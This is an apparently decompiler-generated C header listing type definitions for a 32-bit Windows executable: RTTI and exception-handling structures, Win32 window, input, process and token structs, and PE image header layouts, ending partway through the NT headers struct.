typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor *pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor **pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

typedef struct _s_ESTypeList ESTypeList;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
    ESTypeList *pESTypeList;
    int EHFlags;
};

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

struct _s_ESTypeList {
    int nCount;
    HandlerType *pTypeArray;
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor *pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef struct tagMOUSEINPUT tagMOUSEINPUT, *PtagMOUSEINPUT;

typedef struct tagMOUSEINPUT MOUSEINPUT;

typedef long LONG;

typedef ulong DWORD;

typedef ulong ULONG_PTR;

struct tagMOUSEINPUT {
    LONG dx;
    LONG dy;
    DWORD mouseData;
    DWORD dwFlags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
};

typedef struct tagINPUT tagINPUT, *PtagINPUT;

typedef union _union_859 _union_859, *P_union_859;

typedef struct tagKEYBDINPUT tagKEYBDINPUT, *PtagKEYBDINPUT;

typedef struct tagKEYBDINPUT KEYBDINPUT;

typedef struct tagHARDWAREINPUT tagHARDWAREINPUT, *PtagHARDWAREINPUT;

typedef struct tagHARDWAREINPUT HARDWAREINPUT;

typedef ushort WORD;

struct tagKEYBDINPUT {
    WORD wVk;
    WORD wScan;
    DWORD dwFlags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
};

struct tagHARDWAREINPUT {
    DWORD uMsg;
    WORD wParamL;
    WORD wParamH;
};

union _union_859 {
    MOUSEINPUT mi;
    KEYBDINPUT ki;
    HARDWAREINPUT hi;
};

struct tagINPUT {
    DWORD type;
    union _union_859 field1_0x4;
};

typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef struct tagMSG *LPMSG;

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef struct tagINPUT *LPINPUT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Class Structure
};

typedef struct bad_exception bad_exception, *Pbad_exception;

struct bad_exception { // PlaceHolder Class Structure
};

typedef struct _devicemodeW _devicemodeW, *P_devicemodeW;

typedef union _union_660 _union_660, *P_union_660;

typedef union _union_663 _union_663, *P_union_663;

typedef struct _struct_661 _struct_661, *P_struct_661;

typedef struct _struct_662 _struct_662, *P_struct_662;

typedef struct _POINTL _POINTL, *P_POINTL;

typedef struct _POINTL POINTL;

struct _POINTL {
    LONG x;
    LONG y;
};

union _union_663 {
    DWORD dmDisplayFlags;
    DWORD dmNup;
};

struct _struct_662 {
    POINTL dmPosition;
    DWORD dmDisplayOrientation;
    DWORD dmDisplayFixedOutput;
};

struct _struct_661 {
    short dmOrientation;
    short dmPaperSize;
    short dmPaperLength;
    short dmPaperWidth;
    short dmScale;
    short dmCopies;
    short dmDefaultSource;
    short dmPrintQuality;
};

union _union_660 {
    struct _struct_661 field0;
    struct _struct_662 field1;
};

struct _devicemodeW {
    WCHAR dmDeviceName[32];
    WORD dmSpecVersion;
    WORD dmDriverVersion;
    WORD dmSize;
    WORD dmDriverExtra;
    DWORD dmFields;
    union _union_660 field6_0x4c;
    short dmColor;
    short dmDuplex;
    short dmYResolution;
    short dmTTOption;
    short dmCollate;
    WCHAR dmFormName[32];
    WORD dmLogPixels;
    DWORD dmBitsPerPel;
    DWORD dmPelsWidth;
    DWORD dmPelsHeight;
    union _union_663 field17_0xb4;
    DWORD dmDisplayFrequency;
    DWORD dmICMMethod;
    DWORD dmICMIntent;
    DWORD dmMediaType;
    DWORD dmDitherType;
    DWORD dmReserved1;
    DWORD dmReserved2;
    DWORD dmPanningWidth;
    DWORD dmPanningHeight;
};

typedef struct tagRGBQUAD tagRGBQUAD, *PtagRGBQUAD;

struct tagRGBQUAD {
    BYTE rgbBlue;
    BYTE rgbGreen;
    BYTE rgbRed;
    BYTE rgbReserved;
};

typedef struct tagBITMAPINFO tagBITMAPINFO, *PtagBITMAPINFO;

typedef struct tagBITMAPINFOHEADER tagBITMAPINFOHEADER, *PtagBITMAPINFOHEADER;

typedef struct tagBITMAPINFOHEADER BITMAPINFOHEADER;

typedef struct tagRGBQUAD RGBQUAD;

struct tagBITMAPINFOHEADER {
    DWORD biSize;
    LONG biWidth;
    LONG biHeight;
    WORD biPlanes;
    WORD biBitCount;
    DWORD biCompression;
    DWORD biSizeImage;
    LONG biXPelsPerMeter;
    LONG biYPelsPerMeter;
    DWORD biClrUsed;
    DWORD biClrImportant;
};

struct tagBITMAPINFO {
    BITMAPINFOHEADER bmiHeader;
    RGBQUAD bmiColors[1];
};

typedef struct _devicemodeW DEVMODEW;

typedef struct tagBITMAPINFO *LPBITMAPINFO;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _LUID {
    DWORD LowPart;
    LONG HighPart;
};

struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
};

struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[1];
};

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *PCNZWCH;

typedef WCHAR *LPWCH;

typedef struct _LUID *PLUID;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef struct _TOKEN_PRIVILEGES *PTOKEN_PRIVILEGES;

typedef DWORD LCID;

typedef CHAR *PCNZCH;

typedef HANDLE *PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR SIZE_T;

typedef ULONG_PTR DWORD_PTR;

typedef void (*_PHNDLR)(int);

typedef struct DotNetPdbInfo DotNetPdbInfo, *PDotNetPdbInfo;

struct DotNetPdbInfo {
    char signature[4];
    GUID guid;
    dword age;
    char pdbpath[48];
};

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _strflt *STRFLT;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

struct HBITMAP__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef DWORD *PDWORD;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef int INT;

typedef WORD ATOM;

typedef struct tagRECT *LPRECT;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef void *HGDIOBJ;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef struct HRSRC__ *HRSRC;

typedef struct HBITMAP__ *HBITMAP;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
